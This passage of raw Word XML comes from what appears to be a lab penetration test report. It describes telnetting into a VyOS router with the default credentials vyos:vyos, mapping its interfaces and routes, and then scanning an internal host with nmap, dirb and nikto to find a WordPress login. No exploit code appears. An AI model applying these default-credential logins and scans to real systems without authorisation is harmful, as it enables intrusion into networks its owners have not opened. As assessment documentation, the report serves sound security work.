      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> in testing.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53BA0FD8" w14:textId="00BC0D73" w:rsidR="005E001F" w:rsidRDefault="005E001F" w:rsidP="005E001F">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:ind w:right="4"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="11" w:name="_Toc183984553"/>
      <w:r>
        <w:t>Routers</w:t>
      </w:r>
      <w:bookmarkEnd w:id="11"/>
    </w:p>
    <w:p w14:paraId="5B801057" w14:textId="71C395A0" w:rsidR="005E001F" w:rsidRPr="00521489" w:rsidRDefault="005E001F" w:rsidP="005E001F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="12" w:name="_Toc183984554"/>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Router </w:t>
      </w:r>
      <w:r w:rsidR="00E91521" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:bookmarkEnd w:id="12"/>
    </w:p>
    <w:p w14:paraId="686C1F7F" w14:textId="4B025F6E" w:rsidR="007E501D" w:rsidRPr="00521489" w:rsidRDefault="007E501D" w:rsidP="000B1DAB">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">As found in the initial scanning process, the first router connected to the kali machine </w:t>
      </w:r>
      <w:r w:rsidR="00CD58A0" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidR="00E726CD" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> routed to the IP 192.168.0.193</w:t>
      </w:r>
      <w:r w:rsidR="005B5640" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> through an ethernet port</w:t>
      </w:r>
      <w:r w:rsidR="00E726CD" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">.  This router displayed 4 open ports that revealed themselves to the initial nmap scanning, one of which being a telnet port.  The tester ran </w:t>
      </w:r>
      <w:r w:rsidR="00276BAD" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>telnet on the routers IP address</w:t>
      </w:r>
      <w:r w:rsidR="00CD58A0" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to discover</w:t>
      </w:r>
      <w:r w:rsidR="00276BAD" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a vyos login.  </w:t>
      </w:r>
      <w:r w:rsidR="00B965E6" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">When researching vyos, the tester discovered that they produced </w:t>
      </w:r>
      <w:r w:rsidR="00CD58A0" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Open-Source</w:t>
      </w:r>
      <w:r w:rsidR="00B965E6" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> router and firewall software. </w:t>
      </w:r>
      <w:r w:rsidR="000B1DAB" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">The assumption </w:t>
      </w:r>
      <w:r w:rsidR="00CD58A0" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidR="000B1DAB" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> made that this vyos login is for access onto the router itself.  </w:t>
      </w:r>
      <w:r w:rsidR="00276BAD" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The tester attempt</w:t>
      </w:r>
      <w:r w:rsidR="00CD58A0" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00276BAD" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to login with the base credentials vyos:vyos </w:t>
      </w:r>
      <w:r w:rsidR="00B22717" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">with instant success.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E3D13AE" w14:textId="77777777" w:rsidR="00B22717" w:rsidRPr="00521489" w:rsidRDefault="00B22717" w:rsidP="003021E4">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20C4303E" w14:textId="3900A062" w:rsidR="008A5A7E" w:rsidRPr="00521489" w:rsidRDefault="008A5A7E" w:rsidP="008A5A7E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2EE53521" wp14:editId="03D5B801">
            <wp:extent cx="3914140" cy="1475740"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="61889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140" cy="1475740"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EFE8929" w14:textId="19463CDF" w:rsidR="008A5A7E" w:rsidRPr="00521489" w:rsidRDefault="008A5A7E" w:rsidP="008A5A7E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure</w:t>
      </w:r>
      <w:r w:rsidR="00DD616C" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. telnet</w:t>
      </w:r>
      <w:r w:rsidR="00DD616C" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> vyos login.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AC097FD" w14:textId="52A41114" w:rsidR="00E62C0D" w:rsidRPr="00521489" w:rsidRDefault="008C4F7E" w:rsidP="00E62C0D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Now successfully logged into </w:t>
      </w:r>
      <w:r w:rsidR="00ED7F32" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the router</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, the tester look</w:t>
      </w:r>
      <w:r w:rsidR="00CD58A0" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> for the interfaces connected to the </w:t>
      </w:r>
      <w:r w:rsidR="00ED7F32" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>outer</w:t>
      </w:r>
      <w:r w:rsidR="00DF7320" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> as well as the </w:t>
      </w:r>
      <w:r w:rsidR="00513555" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>IP</w:t>
      </w:r>
      <w:r w:rsidR="00DF7320" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> route.  These reveal</w:t>
      </w:r>
      <w:r w:rsidR="00CD58A0" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DF7320" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2 more ethernet ports being used as direct connections to the router, implying more devices are connected.  The devices appear to have the IP addresses of 172.16.221.0/24 and 192.168.0.224/</w:t>
      </w:r>
      <w:r w:rsidR="00E62C0D" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">30 and are connected to ports eth2 and eth1 respectively.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="681E13D9" w14:textId="4AD4AFC3" w:rsidR="00726D0A" w:rsidRPr="00521489" w:rsidRDefault="00726D0A" w:rsidP="008A5A7E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="33A3AA67" wp14:editId="059F4989">
            <wp:extent cx="3830955" cy="1018540"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="20348265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0955" cy="1018540"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E4C0165" w14:textId="1774E314" w:rsidR="00726D0A" w:rsidRPr="00521489" w:rsidRDefault="00726D0A" w:rsidP="00EE77FD">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure 5. </w:t>
      </w:r>
      <w:r w:rsidR="00EE77FD" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>interfaces connected to the router.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75644DFB" w14:textId="76E953CA" w:rsidR="00726D0A" w:rsidRPr="00521489" w:rsidRDefault="009A5BD8" w:rsidP="008A5A7E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3EE4F22C" wp14:editId="55674C5C">
            <wp:extent cx="5701030" cy="2555875"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1932790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1030" cy="2555875"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="70060585" w14:textId="2271208B" w:rsidR="009A5BD8" w:rsidRPr="00521489" w:rsidRDefault="009A5BD8" w:rsidP="008A5A7E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure 6. </w:t>
      </w:r>
      <w:r w:rsidR="00EE77FD" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ip route of the router.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="639D3E4F" w14:textId="75765599" w:rsidR="00E62C0D" w:rsidRPr="00521489" w:rsidRDefault="00E62C0D" w:rsidP="00E62C0D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">For the </w:t>
      </w:r>
      <w:r w:rsidR="009E5558" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">first eth2 connection, a nmap scan </w:t>
      </w:r>
      <w:r w:rsidR="009C1A86" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidR="009E5558" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> run to find all open ports on the connection.  This revealed to the tester </w:t>
      </w:r>
      <w:r w:rsidR="00145AA9" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">a possible </w:t>
      </w:r>
      <w:r w:rsidR="00E16518" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>website</w:t>
      </w:r>
      <w:r w:rsidR="00145AA9" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> connection to the IP as well as a ssh connection</w:t>
      </w:r>
      <w:r w:rsidR="00E16518" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">.  Traversal to the webpage reveals </w:t>
      </w:r>
      <w:r w:rsidR="004C19CA" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a functional connection as shown in Figure 8.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56F729F5" w14:textId="3F02867D" w:rsidR="001064D3" w:rsidRPr="00521489" w:rsidRDefault="004828BF" w:rsidP="008A5A7E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="31881B10" wp14:editId="49BBA700">
            <wp:extent cx="3685540" cy="1793875"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="14294127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5540" cy="1793875"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="729456A4" w14:textId="60F8E1E1" w:rsidR="00992B89" w:rsidRPr="00521489" w:rsidRDefault="00992B89" w:rsidP="008A5A7E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 7. nmap scan based on the results of the scans above and the table calculations</w:t>
      </w:r>
      <w:r w:rsidR="004828BF" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> for 172.16.221.16</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26AEA334" w14:textId="5923CC72" w:rsidR="004828BF" w:rsidRPr="00521489" w:rsidRDefault="006F7FF8" w:rsidP="008A5A7E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7679B321" wp14:editId="37CD46D9">
            <wp:extent cx="4232275" cy="1600200"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1892624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2275" cy="1600200"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="068BFE41" w14:textId="66925A98" w:rsidR="006F7FF8" w:rsidRPr="00521489" w:rsidRDefault="006F7FF8" w:rsidP="008A5A7E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 8. 172.16.221.237 website.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D057BCA" w14:textId="0ECA75B9" w:rsidR="004C19CA" w:rsidRPr="00521489" w:rsidRDefault="004C19CA" w:rsidP="004C19CA">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">With a proper connection to the webpage established, </w:t>
      </w:r>
      <w:r w:rsidR="00604214" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the tester utiliz</w:t>
      </w:r>
      <w:r w:rsidR="00FE46FB" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>es</w:t>
      </w:r>
      <w:r w:rsidR="00604214" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00096363" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r w:rsidR="00604214" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">web penetration testing tool, dirb, to enumerate possible extensions that the webpage could be using.  The results of these scans can be </w:t>
      </w:r>
      <w:r w:rsidR="00096363" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>found in Figure 9 and allowed for the tester to navigate to a /wordpress/ webpage with a login</w:t>
      </w:r>
      <w:r w:rsidR="0065536C" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> window.  Figure 10 reveals </w:t>
      </w:r>
      <w:r w:rsidR="00AE41FF" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>what the tester saw navigating to the wordpress webpage.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CAB9355" w14:textId="0CFEA1E9" w:rsidR="006F7FF8" w:rsidRPr="00521489" w:rsidRDefault="006F7FF8" w:rsidP="008A5A7E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4A54C64B" wp14:editId="0236D7BA">
            <wp:extent cx="3990340" cy="5493385"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="829399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0340" cy="5493385"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EAF2500" w14:textId="01C2C6A7" w:rsidR="006F7FF8" w:rsidRPr="00521489" w:rsidRDefault="006F7FF8" w:rsidP="008A5A7E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 9. dirb scan of the website 172.16.221.237.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79B7E287" w14:textId="61E53A02" w:rsidR="006F7FF8" w:rsidRPr="00521489" w:rsidRDefault="00D0387A" w:rsidP="008A5A7E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="02E91AD3" wp14:editId="7EAC122E">
            <wp:extent cx="5943600" cy="3519170"/>
            <wp:effectExtent l="0" t="0" r="0" b="5080"/>
            <wp:docPr id="1400068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14:paraId="463F2BF6" w14:textId="4083751B" w:rsidR="00D0387A" w:rsidRPr="00521489" w:rsidRDefault="00D0387A" w:rsidP="008A5A7E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 10. wordpress extension on the webpage found from the dirb scan.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C6C1C4C" w14:textId="61600903" w:rsidR="00AE41FF" w:rsidRPr="00521489" w:rsidRDefault="00AE41FF" w:rsidP="00AE41FF">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Utilizing another web penetration tool, nikto, the tester manage</w:t>
      </w:r>
      <w:r w:rsidR="00FE46FB" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r w:rsidR="008D5685" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">collect the banner of the </w:t>
      </w:r>
      <w:r w:rsidR="0013115E" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">webpage which </w:t>
      </w:r>
      <w:r w:rsidR="00FE46FB" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>gives</w:t>
      </w:r>
      <w:r w:rsidR="0013115E" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> several </w:t>
      </w:r>
      <w:r w:rsidR="0017611E" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">pieces of information.  Notably, the Operating System of the web server as well as the </w:t>
      </w:r>
      <w:r w:rsidR="001072AB" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">version of all software on the server </w:t>
      </w:r>
      <w:r w:rsidR="00FE46FB" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>are</w:t>
      </w:r>
      <w:r w:rsidR="001072AB" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
